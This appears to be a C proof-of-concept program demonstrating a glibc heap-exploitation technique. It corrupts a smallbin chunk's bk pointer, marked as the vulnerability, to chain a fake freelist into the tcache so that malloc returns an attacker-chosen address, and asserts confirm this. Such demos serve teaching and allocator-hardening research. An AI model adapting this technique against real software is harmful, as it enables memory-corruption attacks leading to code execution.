#include <stdlib.h>
#include <assert.h>

int main(int argc, char * argv[]){

	char* target_chunk[4] = {0};
	char *target =(char *)target_chunk+0x10;
	//the smallbin chunk we will overwrite the bk of
	char *victim = malloc(0x510);
	char *tcache = (char*)victim - 0x250;
	//to avoid consolidation with top
	char *guard = malloc(0x1000);
	//put victim in unsorted bin
	free(victim);
	//allocate a chunk that will be cut from victim 
	//the size of the remainder is 0x110(with metadata)
	char *trim_victim = malloc(0x400);
	//update victim to reflect the trim
	victim =  trim_victim + 0x410;
	//the victim including metadata
	char **victim_chunk = (char **)victim-2;
	//the chunk we will overwrite in its tcache entry
	//its entry is the one immediately following the one
	//corresponding to victim size
	char *tcache_target = malloc(0x110);
	tcache += 0x40 + (int)(0x110/0x10 - 1 )*8 ;

	//sort victim into the small bin
	//this progression bypasses filling the tcache 
	//so 6 less allocations
	void *sort = malloc(0x1000);
	//put in tcache
	free(tcache_target);
	//keep the address of the smallbin for later sanity check
	char *smallbin = victim_chunk[2];

	//create a fake freelist on the heap , we can use 
	//the trim result for that
	char * (*freelist)[4] = (char * (*)[4])trim_victim;
	//links the fake list chunks
	for(int i=0; i<5; i++) {
		freelist[i][3] = (char*) freelist[i+1];
	}
	//to bypass the smallbin fd check
	freelist[0][2] = (char *) victim_chunk;
	//make target the 7th chunk in the fake freelist
	freelist[5][3] = (char *) target_chunk;

	//the address of the smallbin will be written to (target->bk)->fd
	target_chunk[3] = (void*)tcache-0x10;

	//------------VULNERABILITY-----------
	victim_chunk[3] = (char *)freelist[0]; 
	//------------------------------------

	//this allocates victim and starts filling tcache with chunks from
	//our freelist 
	char *trigger = malloc(0x100);
	//this allocates target 
	char *alloc1 = malloc(0x100);
	assert((long)alloc1 == (long)target);
	//this allocates the smallbin address
	char *alloc2 = malloc(0x110);
	assert((long)alloc2 == (long)smallbin);
	exit(0);
}
